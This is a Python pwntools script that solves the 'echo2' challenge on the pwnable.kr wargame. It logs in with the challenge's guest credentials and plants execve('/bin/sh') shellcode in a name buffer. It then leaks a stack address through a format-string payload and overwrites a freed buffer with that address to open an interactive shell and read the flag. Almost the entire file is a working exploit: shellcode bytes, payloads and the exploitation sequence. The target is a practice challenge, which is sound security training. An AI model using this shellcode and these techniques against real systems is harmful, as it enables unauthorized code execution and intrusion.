from pwn import *
import time

def printd(s):
    print(f"\n*****start\n\n {s} \n\n*****end\n")
def sendl(s, pr = True, enc = True): 
    time.sleep(0.3)
    if pr: print(s)
    echo2.sendline(s)
def recv(line = False, pr = True): 
    time.sleep(0.3)
    if line: data = echo2.recvline().decode('utf-8', errors = 'replace')
    else: data = echo2.recv().decode('utf-8', errors = 'replace')
    if pr: print(data, end = '')
    return data

""" shellcode 1-- requires on having "/usr/bin/sh" stored elsewhere
addr_e3buf16 = "\xf0\x36\x60\x00"
mov_rax_3b = "\xb8\x3b\x00\x00\x00"
mov_rdi_addr_e3buf16 = "\xbf" + addr_e3buf16
zero_rsi = "\x48\x31\xf6"
zero_rdx = "\x48\x31\xd2"
syscall = "\x0f\x05"
shellcode = mov_rax_3b + mov_rdi_addr_e3buf16 + zero_rsi + zero_rdx + syscall
"""

""" shellcode 2-- embeds "/usr/bin/sh", but does not zero out argv/envp args """
shellcode = "\x6a\x3b\x58\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x48\x31\xd2\x0f\x05"

payload1 = "AaaaBbbbCcccDddd/usr/bin/sh\x00" # TODO obsolete
payload2 = "%10$p"
payload3 = "AaaaBbbbCcccDdddEeeeFfff"

sh = ssh(user = 'echo2', host = 'pwnable.kr', port = 2222, password = 'guest')

# Start program
# echo2 = sh.run('gdb echo2')
# sendl("b cleanup")
# sendl("run")
# echo2 = sh.run('ltrace -S -n 4 -o /tmp/k280_e2_out ./echo2') # -S: system calls as well | -n 4: indent nested calls | -D 77: show all ltrace debug messages
# echo2 = sh.run("./echo2 | tee /tmp/k280_e2_out")
echo2 = sh.run("nc 0 9011")
recv()

# Enter 'name' -- install shellcode
sendl(shellcode)
recv()

# Enter echo3, install payload1 ("/usr/bin/sh" into echo3buf[16:]) # TODO obsolete
sendl("3")
recv()
sendl(payload1)
recv()

# EXP2: Enter echo2, leak address of echo2 ebp, calculate address of 'name'
sendl("2")
recv()
sendl(payload2)
addr = recv(line = True)
addr = int(addr, 16) - 0x20
recv()

# EXP1: Start exiting, but cancel
sendl("4")
recv()
sendl("n")
recv()

# Enter echo3, install payload3 (address of 'name' into buf[24:])
sendl("3")
recv()
payload3 = payload3.encode('utf-8') + p64(addr, endianness = "little", sign = "unsigned")
sendl(payload3)
printd("payload delivered -- enter menu 2 or 3 to trigger")
echo2.interactive()

# 
"""
recv()

# Enter echo2 to trigger payload
sendl("2")
recv()
sendl("cat flag")
recv()
"""

# print(f"addr: {hex(addr)} | payload3: {payload3}")
